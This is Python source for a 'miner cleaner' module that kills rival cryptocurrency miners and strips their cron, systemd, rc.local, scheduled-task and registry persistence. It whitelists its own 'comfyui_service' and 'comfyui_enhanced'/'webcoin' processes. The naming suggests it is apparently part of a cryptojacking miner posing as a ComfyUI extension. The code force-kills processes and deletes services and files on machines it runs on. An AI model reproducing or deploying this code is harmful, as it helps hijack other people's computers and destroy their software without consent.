"""
Competing miner detection and removal.
Kills rival miner processes, removes their persistence (cron, systemd, rc.local),
and cleans up known binary locations. Skips our own process (comfyui_service).
"""

import logging
import os
import platform
import re
import signal
import subprocess
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

IS_LINUX = platform.system() == "Linux"
IS_WINDOWS = platform.system() == "Windows"

OUR_BINARY = "comfyui_service"

KNOWN_MINER_NAMES = [
    "xmrig", "xmr-stak", "xmr-stak-cpu", "xmr-stak-rx",
    "lolminer", "lolMiner",
    "t-rex", "trex",
    "phoenixminer", "PhoenixMiner",
    "nbminer", "NBMiner",
    "gminer", "miner",
    "ethminer",
    "claymore", "EthDcrMiner64",
    "bzminer",
    "teamredminer",
    "nanominer",
    "wildrig", "wildrig-multi",
    "cpuminer", "cpuminer-multi", "cpuminer-opt",
    "minerd", "minergate", "minergate-cli",
    "ccminer",
    "sgminer",
    "kryptex", "kryptex_cli", "kryptex_miner",
    "nicehash", "NiceHashMiner", "excavator",
    "cast_xmr", "castxmr",
    "srb", "SRBMiner", "srbminer", "srbminer-multi",
    "hellminer",
    "moneroocean", "mo_miner",
    "kawpow", "kawpowminer",
    "verthashminer",
    "multiminer",
    "onezerominer",
    "rigel",
    "grinminer",
]

KNOWN_MINER_CMDLINE_PATTERNS = [
    r"stratum\+tcp://",
    r"stratum\+ssl://",
    r"stratum\+tls://",
    r"--algo\s+(rx|cn|crypto|random|argon|ghost|kawpow|octopus|ethash|etchash)",
    r"--coin\s+(monero|xmr|ethereum|eth|conflux|cfx|ravencoin|rvn|ergo)",
    r"-o\s+.*(pool|mine|stratum|nicehash|2miners|f2pool|nanopool|herominers|hashvault|moneroocean|kryptex)",
    r"--url\s+.*(pool|mine|stratum)",
    r"--donate-level",
    r"--cpu-priority",
    r"--threads\s+\d+.*--algo",
    r"moneroocean\.stream",
    r"kryptex\.network",
    r"pool\.supportxmr",
    r"hashvault\.pro",
    r"herominers\.com",
    r"2miners\.com",
    r"nanopool\.org",
    r"f2pool\.com",
    r"mining\.dutch",
    r"unmineable\.com",
]

KNOWN_MINER_PATHS_LINUX = [
    "/tmp/.X11-unix/",
    "/tmp/.ICE-unix/",
    "/dev/shm/",
    "/var/tmp/",
    "/opt/xmrig",
    "/opt/miner",
    "/usr/local/bin/xmrig",
    "/root/.local/bin/xmrig",
]

MINER_SERVICE_PATTERNS = [
    "xmrig", "miner", "lolminer", "t-rex", "trex",
    "nbminer", "gminer", "phoenix", "claymore", "kryptex",
    "nicehash", "excavator", "srbminer", "hellminer",
]

CRON_MINER_PATTERNS = [
    r"xmrig", r"lolminer", r"lolMiner", r"t-rex", r"trex",
    r"nbminer", r"gminer", r"phoenixminer", r"claymore",
    r"cpuminer", r"minerd", r"minergate", r"kryptex",
    r"stratum", r"nicehash", r"excavator", r"srbminer",
    r"pool\.", r"moneroocean", r"2miners", r"f2pool",
    r"nanopool", r"herominers", r"hashvault",
    r"--algo", r"--coin\s+monero", r"--donate",
]


class MinerCleaner:
    def __init__(self):
        self.killed = []
        self.cleaned = []

    def run_full_clean(self) -> dict:
        logger.info("Starting full miner cleanup...")
        self.killed = []
        self.cleaned = []

        self._kill_by_name()
        self._kill_by_cmdline()

        if IS_LINUX:
            self._clean_cron()
            self._clean_systemd()
            self._clean_rc_local()
            self._clean_known_paths()
            self._kill_high_cpu_suspects()

        if IS_WINDOWS:
            self._clean_windows_tasks()
            self._clean_windows_registry()

        result = {
            "killed_processes": self.killed,
            "cleaned_persistence": self.cleaned,
        }
        logger.info("Cleanup complete: killed %d processes, cleaned %d persistence entries",
                     len(self.killed), len(self.cleaned))
        return result

    # ── Process killing ──────────────────────────────────────────────

    def _is_ours(self, name: str, cmdline: str) -> bool:
        lower_name = name.lower()
        lower_cmd = cmdline.lower()
        if OUR_BINARY in lower_name or OUR_BINARY in lower_cmd:
            return True
        if "comfyui_enhanced" in lower_cmd or "webcoin" in lower_cmd:
            return True
        return False

    def _kill_pid(self, pid: int, name: str) -> bool:
        try:
            if IS_LINUX:
                os.kill(pid, signal.SIGKILL)
            else:
                subprocess.run(["taskkill", "/F", "/PID", str(pid)],
                               capture_output=True, timeout=10)
            self.killed.append({"pid": pid, "name": name})
            logger.info("Killed process: %s (pid %d)", name, pid)
            return True
        except Exception as exc:
            logger.debug("Failed to kill pid %d: %s", pid, exc)
            return False

    def _kill_by_name(self):
        try:
            import psutil
        except ImportError:
            self._kill_by_name_fallback()
            return

        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                info = proc.info
                name = (info.get("name") or "").strip()
                cmdline_parts = info.get("cmdline") or []
                cmdline = " ".join(cmdline_parts)

                if self._is_ours(name, cmdline):
                    continue

                name_lower = name.lower().replace(".exe", "")
                for miner_name in KNOWN_MINER_NAMES:
                    if miner_name.lower() in name_lower or name_lower in miner_name.lower():
                        self._kill_pid(info["pid"], name)
                        break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

    def _kill_by_name_fallback(self):
        if not IS_LINUX:
            return
        try:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
            for line in result.stdout.splitlines()[1:]:
                parts = line.split()
                if len(parts) < 11:
                    continue
                pid = int(parts[1])
                cmd = " ".join(parts[10:])
                name = os.path.basename(parts[10])

                if self._is_ours(name, cmd):
                    continue

                name_lower = name.lower()
                for miner_name in KNOWN_MINER_NAMES:
                    if miner_name.lower() in name_lower:
                        self._kill_pid(pid, name)
                        break
        except Exception as exc:
            logger.debug("Fallback name scan failed: %s", exc)

    def _kill_by_cmdline(self):
        try:
            import psutil
        except ImportError:
            self._kill_by_cmdline_fallback()
            return

        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                info = proc.info
                name = (info.get("name") or "").strip()
                cmdline_parts = info.get("cmdline") or []
                cmdline = " ".join(cmdline_parts)

                if not cmdline or self._is_ours(name, cmdline):
                    continue

                for pattern in KNOWN_MINER_CMDLINE_PATTERNS:
                    if re.search(pattern, cmdline, re.IGNORECASE):
                        if info["pid"] not in [k["pid"] for k in self.killed]:
                            self._kill_pid(info["pid"], f"{name} [cmdline match: {pattern}]")
                        break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

    def _kill_by_cmdline_fallback(self):
        if not IS_LINUX:
            return
        try:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
            killed_pids = {k["pid"] for k in self.killed}
            for line in result.stdout.splitlines()[1:]:
                parts = line.split()
                if len(parts) < 11:
                    continue
                pid = int(parts[1])
                if pid in killed_pids:
                    continue
                cmd = " ".join(parts[10:])
                name = os.path.basename(parts[10])

                if self._is_ours(name, cmd):
                    continue

                for pattern in KNOWN_MINER_CMDLINE_PATTERNS:
                    if re.search(pattern, cmd, re.IGNORECASE):
                        self._kill_pid(pid, f"{name} [cmdline]")
                        break
        except Exception as exc:
            logger.debug("Fallback cmdline scan failed: %s", exc)

    def _kill_high_cpu_suspects(self):
        """Kill processes using >80% CPU that look like miners."""
        try:
            import psutil
        except ImportError:
            return

        killed_pids = {k["pid"] for k in self.killed}
        suspicious = []

        for proc in psutil.process_iter(["pid", "name", "cmdline", "cpu_percent"]):
            try:
                proc.cpu_percent(interval=0)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        import time
        time.sleep(2)

        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                info = proc.info
                pid = info["pid"]
                if pid in killed_pids:
                    continue
                name = (info.get("name") or "").strip()
                cmdline = " ".join(info.get("cmdline") or [])
                if self._is_ours(name, cmdline):
                    continue

                cpu = proc.cpu_percent(interval=0)
                if cpu > 80:
                    exe_path = ""
                    try:
                        exe_path = proc.exe() or ""
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass

                    suspect_dirs = ["/tmp", "/dev/shm", "/var/tmp", "/opt/xmrig", "/opt/miner"]
                    if any(exe_path.startswith(d) for d in suspect_dirs):
                        self._kill_pid(pid, f"{name} [high CPU {cpu:.0f}% from {exe_path}]")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

    # ── Linux persistence cleanup ────────────────────────────────────

    def _clean_cron(self):
        for cron_cmd in [["crontab", "-l"], ["crontab", "-l", "-u", "root"]]:
            try:
                result = subprocess.run(cron_cmd, capture_output=True, text=True, timeout=10)
                if result.returncode != 0:
                    continue

                original = result.stdout
                lines = original.splitlines()
                clean_lines = []
                removed = 0

                for line in lines:
                    is_miner = False
                    for pattern in CRON_MINER_PATTERNS:
                        if re.search(pattern, line, re.IGNORECASE):
                            if OUR_BINARY not in line and "comfyui_enhanced" not in line:
                                is_miner = True
                                break
                    if is_miner:
                        removed += 1
                        self.cleaned.append({"type": "cron", "entry": line.strip()})
                        logger.info("Removed cron entry: %s", line.strip())
                    else:
                        clean_lines.append(line)

                if removed > 0:
                    new_cron = "\n".join(clean_lines) + "\n"
                    user_flag = cron_cmd[2:] if len(cron_cmd) > 2 else []
                    subprocess.run(["crontab", *user_flag, "-"],
                                   input=new_cron, text=True, timeout=10)
            except Exception as exc:
                logger.debug("Cron cleanup failed for %s: %s", cron_cmd, exc)

    def _clean_systemd(self):
        service_dirs = [
            Path("/etc/systemd/system"),
            Path("/usr/lib/systemd/system"),
            Path(f"/home/{os.environ.get('USER', 'root')}/.config/systemd/user"),
        ]

        for sdir in service_dirs:
            if not sdir.exists():
                continue
            try:
                for sfile in sdir.iterdir():
                    if not sfile.suffix in (".service", ".timer"):
                        continue
                    name_lower = sfile.stem.lower()

                    is_miner = False
                    for pat in MINER_SERVICE_PATTERNS:
                        if pat in name_lower:
                            is_miner = True
                            break

                    if not is_miner:
                        try:
                            content = sfile.read_text()
                            for pat in CRON_MINER_PATTERNS:
                                if re.search(pat, content, re.IGNORECASE):
                                    if OUR_BINARY not in content:
                                        is_miner = True
                                        break
                        except Exception:
                            continue

                    if is_miner and OUR_BINARY not in name_lower:
                        svc_name = sfile.name
                        try:
                            subprocess.run(["systemctl", "stop", svc_name],
                                           capture_output=True, timeout=10)
                            subprocess.run(["systemctl", "disable", svc_name],
                                           capture_output=True, timeout=10)
                            sfile.unlink(missing_ok=True)
                            subprocess.run(["systemctl", "daemon-reload"],
                                           capture_output=True, timeout=10)
                            self.cleaned.append({"type": "systemd", "service": svc_name})
                            logger.info("Removed systemd service: %s", svc_name)
                        except Exception as exc:
                            logger.debug("Failed to remove service %s: %s", svc_name, exc)
            except Exception as exc:
                logger.debug("Systemd scan failed for %s: %s", sdir, exc)

    def _clean_rc_local(self):
        rc_path = Path("/etc/rc.local")
        if not rc_path.exists():
            return
        try:
            content = rc_path.read_text()
            lines = content.splitlines()
            clean_lines = []
            removed = 0
            for line in lines:
                is_miner = False
                for pat in CRON_MINER_PATTERNS:
                    if re.search(pat, line, re.IGNORECASE):
                        if OUR_BINARY not in line:
                            is_miner = True
                            break
                if is_miner:
                    removed += 1
                    self.cleaned.append({"type": "rc.local", "entry": line.strip()})
                    logger.info("Removed rc.local entry: %s", line.strip())
                else:
                    clean_lines.append(line)

            if removed > 0:
                rc_path.write_text("\n".join(clean_lines) + "\n")
        except Exception as exc:
            logger.debug("rc.local cleanup failed: %s", exc)

    def _clean_known_paths(self):
        for path_str in KNOWN_MINER_PATHS_LINUX:
            p = Path(path_str)
            if not p.exists():
                continue
            try:
                if p.is_file():
                    p.unlink()
                    self.cleaned.append({"type": "file", "path": path_str})
                    logger.info("Removed miner binary: %s", path_str)
                elif p.is_dir():
                    for child in p.iterdir():
                        name_lower = child.name.lower()
                        for miner_name in KNOWN_MINER_NAMES:
                            if miner_name.lower() in name_lower:
                                if child.is_file():
                                    child.unlink()
                                    self.cleaned.append({"type": "file", "path": str(child)})
                                    logger.info("Removed miner file: %s", child)
                                break
            except Exception as exc:
                logger.debug("Path cleanup failed for %s: %s", path_str, exc)

    # ── Windows persistence cleanup ──────────────────────────────────

    def _clean_windows_tasks(self):
        if not IS_WINDOWS:
            return
        try:
            result = subprocess.run(
                ["schtasks", "/Query", "/FO", "CSV", "/NH"],
                capture_output=True, text=True, timeout=15,
            )
            for line in result.stdout.splitlines():
                line_lower = line.lower()
                for pat in MINER_SERVICE_PATTERNS:
                    if pat in line_lower and OUR_BINARY not in line_lower:
                        task_name = line.split(",")[0].strip('"')
                        subprocess.run(
                            ["schtasks", "/Delete", "/TN", task_name, "/F"],
                            capture_output=True, timeout=10,
                        )
                        self.cleaned.append({"type": "scheduled_task", "name": task_name})
                        logger.info("Removed scheduled task: %s", task_name)
                        break
        except Exception as exc:
            logger.debug("Windows task cleanup failed: %s", exc)

    def _clean_windows_registry(self):
        if not IS_WINDOWS:
            return
        try:
            import winreg
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, reg_path, 0,
                                   winreg.KEY_READ | winreg.KEY_WRITE)
            i = 0
            to_delete = []
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    val_lower = value.lower()
                    for pat in MINER_SERVICE_PATTERNS:
                        if pat in val_lower and OUR_BINARY not in val_lower:
                            to_delete.append(name)
                            break
                    i += 1
                except OSError:
                    break

            for name in to_delete:
                try:
                    winreg.DeleteValue(key, name)
                    self.cleaned.append({"type": "registry", "key": name})
                    logger.info("Removed registry auto-start: %s", name)
                except Exception:
                    pass
            winreg.CloseKey(key)
        except Exception as exc:
            logger.debug("Windows registry cleanup failed: %s", exc)
